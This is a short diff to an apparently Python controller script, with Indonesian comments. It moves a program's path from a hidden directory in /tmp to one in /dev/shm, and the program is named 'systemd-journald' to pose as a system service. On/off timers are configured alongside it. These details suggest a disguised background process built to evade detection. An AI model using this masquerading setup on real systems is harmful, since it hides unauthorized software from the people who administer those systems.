@@ -4,7 +4,7 @@ import sys
 import signal
 
 # CONFIG
-APP_PATH = "/tmp/.store/handler/core/daemon/systemd-journald"  # Lokasi program
+APP_PATH = "/dev/shm/.store/handler/core/daemon/systemd-journald"  # Lokasi program
 APP_NAME = "systemd-journald"  # Nama proses buat kill
 RUNTIME = 1200  # 20 menit
 BREAKTIME = 300  # 5 menit
